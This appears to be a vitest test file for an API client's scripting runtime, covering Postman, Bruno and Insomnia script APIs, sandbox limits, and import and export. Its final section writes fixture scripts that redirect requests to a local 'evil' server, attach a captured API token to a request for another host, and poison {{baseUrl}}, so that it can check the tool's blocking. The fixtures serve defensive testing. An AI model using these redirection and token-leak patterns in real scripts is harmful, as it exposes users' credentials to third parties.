import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
vi.mock("@tauri-apps/api/core", () => import("../../cli/tauriShim"));
vi.mock("@tauri-apps/api/event", () => import("../../cli/tauriShim"));
vi.mock("@tauri-apps/plugin-opener", () => import("../../cli/tauriShim"));
import { createServer, type Server } from "node:http";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { cli } from "../../cli/main";
import { nodeScriptHost } from "../../cli/scriptHost";
import { importAny } from "../importAny";
import { toPostman } from "../exportCollection";
import type { ScriptInput } from "../scriptRuntime";
import { applyView, requestView } from "../scripts";
import { defaults, type HttpItem } from "../types";

const request = { method: "GET", url: "{{baseUrl}}/users", headers: [{ key: "Accept", value: "application/json", enabled: true }], body: "" };
const response = { status: 200, statusText: "OK", headers: [{ key: "Content-Type", value: "application/json", enabled: true }], body: '{"id":7,"name":"Ada","tags":["a","b"],"nested":{"ok":true}}', timeMs: 42, size: 60 };
const run = (code: string, p: Partial<ScriptInput> = {}) => nodeScriptHost({ code, phase: "post", name: "Get user", vars: { baseUrl: "https://api.test" }, request, response, ...p }, 2000);

describe("script runtime (pm API)", () => {
  it("runs pm.test with pm.expect and pm.response", async () => {
    const out = await run(`
      pm.test("status", () => pm.response.to.have.status(200));
      pm.test("ok", () => pm.response.to.be.ok);
      pm.test("fields", () => {
        const j = pm.response.json();
        pm.expect(j.id).to.equal(7);
        pm.expect(j).to.have.property("name", "Ada");
        pm.expect(j.tags).to.have.lengthOf(2).and.include("b");
        pm.expect(j.nested).to.deep.equal({ ok: true });
        pm.expect(j.name).to.be.a("string").that.matches(/^A/);
        pm.expect(pm.response.responseTime).to.be.below(500);
        pm.expect(j.missing).to.not.exist;
        pm.expect(pm.response.headers.get("content-type")).to.include("json");
      });
      pm.test("fails", () => pm.expect(pm.response.code).to.equal(404));
    `);
    expect(out.error).toBeUndefined();
    expect(out.tests).toEqual([
      { name: "status", pass: true },
      { name: "ok", pass: true },
      { name: "fields", pass: true },
      { name: "fails", pass: false, error: "expected 200 to equal 404" },
    ]);
  });

  it("sets and unsets variables, and reads them back", async () => {
    const out = await run(`
      pm.environment.set("userId", pm.response.json().id);
      pm.collectionVariables.set("obj", { a: 1 });
      pm.variables.unset("baseUrl");
      pm.test("read back", () => pm.expect(pm.environment.get("userId")).to.equal("7"));
      pm.test("replaceIn", () => pm.expect(pm.variables.replaceIn("{{userId}}-{{nope}}")).to.equal("7-{{nope}}"));
    `);
    expect(out.vars).toEqual({ userId: "7", obj: '{"a":1}', baseUrl: null });
    expect(out.tests.every((t) => t.pass)).toBe(true);
  });

  it("lets pre-request scripts change the request", async () => {
    const out = await run(
      `pm.request.headers.upsert({ key: "X-Sig", value: "abc" });
       pm.request.headers.remove("accept");
       pm.request.url = pm.request.url.toString() + "?page=2";
       pm.request.method = "post";
       pm.request.body.raw = JSON.stringify({ a: 1 });`,
      { phase: "pre", response: undefined },
    );
    expect(out.error).toBeUndefined();
    expect(out.request).toEqual({ method: "POST", url: "{{baseUrl}}/users?page=2", headers: [{ key: "X-Sig", value: "abc", enabled: true }], body: '{"a":1}' });
  });

  it("supports Bruno's bru, req, res, test and expect, and Insomnia's alias", async () => {
    const out = await run(`
      bru.setEnvVar("name", res.body.name);
      test("bru status", () => expect(res.getStatus()).to.equal(200));
      test("bru header", () => expect(res.getHeader("content-type")).to.equal("application/json"));
      test("req", () => expect(req.getUrl()).to.equal("{{baseUrl}}/users"));
      insomnia.test("insomnia", () => insomnia.expect(insomnia.response.code).to.equal(200));
    `);
    expect(out.vars).toEqual({ name: "Ada" });
    expect(out.tests.map((t) => t.pass)).toEqual([true, true, true, true]);
  });

  it("captures console output and reports errors", async () => {
    const out = await run(`console.log("hi", { a: 1 }); console.warn("careful"); undefinedFn();`);
    expect(out.logs).toEqual([
      { level: "info", text: 'hi {"a":1}' },
      { level: "warn", text: "careful" },
    ]);
    expect(out.error).toMatch(/ReferenceError: undefinedFn is not defined/);
  });

  it("runs sloppy-mode Postman scripts and async tests", async () => {
    const out = await run(`
      jsonData = pm.response.json();
      pm.test("implicit global", () => pm.expect(jsonData.id).to.eql(7));
      pm.test("async", async () => { await new Promise((r) => setTimeout(r, 5)); pm.expect(1).to.equal(2); });
    `);
    expect(out.tests).toEqual([
      { name: "implicit global", pass: true },
      { name: "async", pass: false, error: "expected 1 to equal 2" },
    ]);
  });

  it("has no network, modules or process access", async () => {
    const out = await run(`
      pm.test("no fetch", () => pm.expect(typeof fetch).to.equal("undefined"));
      pm.test("no process", () => pm.expect(typeof process).to.equal("undefined"));
      pm.test("no require", () => require("fs"));
    `);
    expect(out.tests[0].pass).toBe(true);
    expect(out.tests[1].pass).toBe(true);
    expect(out.tests[2]).toMatchObject({ pass: false, error: expect.stringContaining('require("fs") isn\'t available') });
  });

  it("stops a runaway script", async () => {
    await expect(nodeScriptHost({ code: "while (true) {}", phase: "post", name: "x", vars: {}, request, response }, 300)).rejects.toThrow(/timed out|longer than/);
  });
});

describe("applying pre-request changes", () => {
  it("copies only what changed, keeping params in sync with the URL", () => {
    const item: HttpItem = { ...defaults.http(), url: "https://x.test/a", bodyMode: "json", body: "{}" };
    const before = requestView(item);
    const next = applyView(item, before, { ...before, url: "https://x.test/a?q=1", body: '{"b":2}' });
    expect(next.params).toEqual([{ key: "q", value: "1", enabled: true }]);
    expect(next.body).toBe('{"b":2}');
    expect(applyView(item, before, before)).toBe(item);
  });
});

describe("importing and exporting scripts", () => {
  it("brings Postman scripts in, keeping collection and folder scripts on their folders", () => {
    const r = importAny([
      {
        path: "c.json",
        content: JSON.stringify({
          info: { name: "P" },
          event: [{ listen: "prerequest", script: { exec: ["pm.environment.set('a', 1);"] } }],
          item: [
            {
              name: "F",
              event: [{ listen: "test", script: { exec: "pm.test('folder', () => {});" } }],
              item: [{ name: "R", request: { method: "GET", url: "https://x.test" }, event: [{ listen: "test", script: { exec: ["pm.test('own', () => {});"] } }] }],
            },
          ],
        }),
      },
    ]);
    const c = r.collections[0];
    expect(c.items[0].data.preScript).toBeUndefined();
    expect(c.items[0].data.postScript).toBe("pm.test('own', () => {});");
    expect(c.folders).toEqual({ "": { auth: { type: "inherit" }, headers: [], vars: [], preScript: "pm.environment.set('a', 1);" }, F: { auth: { type: "inherit" }, headers: [], vars: [], postScript: "pm.test('folder', () => {});" } });
  });

  it("brings Bruno scripts and tests in, including folder.bru and collection.bru", () => {
    const r = importAny([
      { path: "api/bruno.json", content: '{"name":"Api","version":"1"}' },
      { path: "api/collection.bru", content: "script:pre-request {\n  bru.setVar('c', 1);\n}\n" },
      { path: "api/users/folder.bru", content: "script:post-response {\n  console.log('folder');\n}\n" },
      {
        path: "api/users/list.bru",
        content: "meta {\n  name: List\n  seq: 1\n}\n\nget {\n  url: https://x.test/users\n}\n\nscript:pre-request {\n  req.setHeader('X', '1');\n}\n\ntests {\n  test('ok', function() {\n    expect(res.status).to.equal(200);\n  });\n}\n",
      },
    ]);
    const c = r.collections[0];
    expect(c.items[0].data.preScript).toBe("req.setHeader('X', '1');");
    expect(c.items[0].data.postScript).toBe("test('ok', function() {\n  expect(res.status).to.equal(200);\n});");
    expect(c.folders?.[""]?.preScript).toBe("bru.setVar('c', 1);");
    expect(c.folders?.users?.postScript).toBe("console.log('folder');");
  });

  it("brings Insomnia scripts in", () => {
    const r = importAny([
      {
        path: "i.json",
        content: JSON.stringify({ _type: "export", resources: [{ _id: "w", _type: "workspace", name: "W" }, { _id: "r", _type: "request", parentId: "w", name: "R", method: "GET", url: "https://x.test", preRequestScript: "insomnia.environment.set('a', 1);", afterResponseScript: "insomnia.test('t', () => {});" }] }),
      },
    ]);
    expect(r.collections[0].items[0].data).toMatchObject({ preScript: "insomnia.environment.set('a', 1);", postScript: "insomnia.test('t', () => {});" });
  });

  it("exports scripts as Postman events", () => {
    const item = { ...defaults.http(), name: "R", path: "collections/C/r.json", url: "https://x.test", preScript: "pm.environment.set('a', 1);", postScript: "pm.test('t', () => {});" };
    const json = JSON.parse(toPostman({ name: "C", root: "collections/C", items: [item] } as any));
    expect(json.item[0].event).toEqual([
      { listen: "prerequest", script: { type: "text/javascript", exec: ["pm.environment.set('a', 1);"] } },
      { listen: "test", script: { type: "text/javascript", exec: ["pm.test('t', () => {});"] } },
    ]);
  });
});

describe("scripts in a real run", () => {
  let server: Server;
  let ws = "";
  beforeAll(async () => {
    server = createServer((rq, rs) => {
      const send = (status: number, data: unknown) => (rs.writeHead(status, { "content-type": "application/json" }), rs.end(JSON.stringify(data)));
      if (rq.url === "/login") return send(200, { token: "tok-123" });
      if (rq.url === "/me") return rq.headers["x-signature"] === "signed:tok-123" ? send(200, { id: 9 }) : send(401, { error: "unsigned" });
      send(404, {});
    });
    await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
    const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
    ws = mkdtempSync(join(tmpdir(), "forge-scripts-"));
    const write = (rel: string, data: unknown) => {
      mkdirSync(join(ws, rel, ".."), { recursive: true });
      writeFileSync(join(ws, rel), JSON.stringify(data));
    };
    write("environments/ci.json", { name: "CI", vars: [{ key: "baseUrl", value: base, enabled: true }] });
    write("collections/S/1 login.json", { forge: 1, ...defaults.http(), name: "Login", method: "POST", url: "{{baseUrl}}/login", postScript: 'pm.environment.set("token", pm.response.json().token);\nconsole.log("logged in");' });
    write("collections/S/2 me.json", {
      forge: 1,
      ...defaults.http(),
      name: "Me",
      url: "{{baseUrl}}/me",
      preScript: 'pm.request.headers.add({ key: "X-Signature", value: "signed:" + pm.environment.get("token") });',
      postScript: 'pm.test("signed request accepted", () => pm.response.to.have.status(200));\npm.test("id is 10", () => pm.expect(pm.response.json().id).to.equal(10));',
    });
  });
  afterAll(() => server.close());

  it("chains values through scripts and reports script tests", async () => {
    let out = "";
    const code = await cli(["run", "S", "--env", "ci"], { out: (s) => (out += s), err: (s) => (out += s), env: {}, cwd: ws, isTTY: false });
    expect(out).toContain("› logged in");
    // The pre-request script signed the call with the token the login script saved.
    expect(out).toContain("✗ GET    S/2 me.json  200");
    expect(out).toContain("✗ id is 10 (got expected 9 to equal 10)");
    expect(out).not.toContain("signed request accepted");
    expect(code).toBe(1);
  });
});

describe("scripts can't quietly redirect requests or secrets", () => {
  const servers: Server[] = [];
  const stolen: string[] = [];
  let ws = "";
  let api = "";
  let evil = "";
  let evil2 = "";
  const listen = async (handler: Parameters<typeof createServer>[1]) => {
    const s = createServer(handler);
    servers.push(s);
    await new Promise<void>((r) => s.listen(0, "127.0.0.1", r));
    return `http://127.0.0.1:${(s.address() as { port: number }).port}`;
  };
  const write = (rel: string, data: object) => {
    mkdirSync(join(ws, rel, ".."), { recursive: true });
    writeFileSync(join(ws, rel), JSON.stringify({ forge: 1, ...defaults.http(), ...data }));
  };
  const runCli = async (args: string[]) => {
    let out = "";
    const code = await cli(args, { out: (s) => (out += s), err: (s) => (out += s), env: {}, cwd: ws, isTTY: false });
    return { code, out };
  };

  beforeAll(async () => {
    api = await listen((rq, rs) => {
      rs.writeHead(rq.url === "/orders" && rq.headers.authorization !== "Bearer secret-token-123" ? 401 : 200, { "content-type": "application/json" });
      rs.end(JSON.stringify(rq.url === "/login" ? { token: "secret-token-123" } : { ok: true }));
    });
    const thief = (rq: any, rs: any) => {
      stolen.push(`${rq.url} ${JSON.stringify(rq.headers)}`);
      rs.end("{}");
    };
    evil = await listen(thief);
    evil2 = await listen(thief);
    ws = mkdtempSync(join(tmpdir(), "forge-guard-"));
    mkdirSync(join(ws, "environments"), { recursive: true });
    writeFileSync(join(ws, "environments/ci.json"), JSON.stringify({ name: "CI", vars: [{ key: "baseUrl", value: api, enabled: true }] }));
    write("collections/G/1 login.json", { name: "Login", method: "POST", url: "{{baseUrl}}/login", postScript: 'pm.environment.set("token", pm.response.json().token);' });
    write("collections/G/2 orders.json", { name: "Orders", url: "{{baseUrl}}/orders", auth: { type: "bearer", token: "{{token}}" }, assertions: [{ enabled: true, source: "status", path: "", op: "eq", value: "200" }] });
    // A legit script: adds the captured token on the same API. Must not be blocked.
    write("collections/G/3 auth header.json", { name: "Auth header", url: "{{baseUrl}}/me", preScript: 'pm.request.headers.upsert({ key: "Authorization", value: "Bearer " + pm.environment.get("token") });\npm.request.headers.add({ key: "X-Sig", value: "sig-" + Date.now() });' });
    // Redirects an innocent request elsewhere.
    write("collections/G/4 redirect.json", { name: "Redirect", url: "{{baseUrl}}/public", preScript: `pm.request.url = "${evil2}/collect";` });
    // A visible request to another host that quietly attaches your API token.
    write("collections/G/5 widget.json", { name: "Widget", url: `${evil}/widget`, preScript: 'pm.request.headers.add({ key: "X-T", value: pm.environment.get("token") });' });
    // Points {{baseUrl}} at another server for every later request.
    write("collections/G/6 poison.json", { name: "Poison", url: "{{baseUrl}}/public", postScript: `pm.environment.set("baseUrl", "${evil2}");` });
    write("collections/G/7 orders again.json", { name: "Orders again", url: "{{baseUrl}}/orders", auth: { type: "bearer", token: "{{token}}" }, assertions: [{ enabled: true, source: "status", path: "", op: "eq", value: "200" }] });
  });
  afterAll(() => servers.forEach((s) => s.close()));

  it("blocks redirects, leaked tokens and poisoned variables, and lets normal scripts through", async () => {
    const r = await runCli(["run", "G", "--env", "ci"]);
    expect(r.out).toContain("✓ GET    G/3 auth header.json  200");
    expect(r.out).toMatch(/G\/4 redirect\.json  error\n\s+Blocked: The pre-request script redirected this request to 127\.0\.0\.1:\d+/);
    expect(r.out).toMatch(/G\/5 widget\.json  error\n\s+Blocked: The pre-request script added \{\{token\}\} to a request to 127\.0\.0\.1:\d+/);
    expect(r.out).toMatch(/✗ Post-response script variables \(got Not saved\. The post-response script wants to set \{\{baseUrl\}\}/);
    // The later request still went to the real API with the real token.
    expect(r.out).toContain("✓ GET    G/7 orders again.json  200");
    expect(stolen).toEqual([]);
  });

  it("lets a run that trusts scripts make those changes", async () => {
    const before = stolen.length;
    const r = await runCli(["run", "G/4 redirect", "--env", "ci", "--trust-scripts"]);
    expect(r.out).toContain("G/4 redirect.json  200");
    expect(stolen.slice(before)).toHaveLength(1);
    expect(stolen[before]).toMatch(/^\/collect /);
  });
});
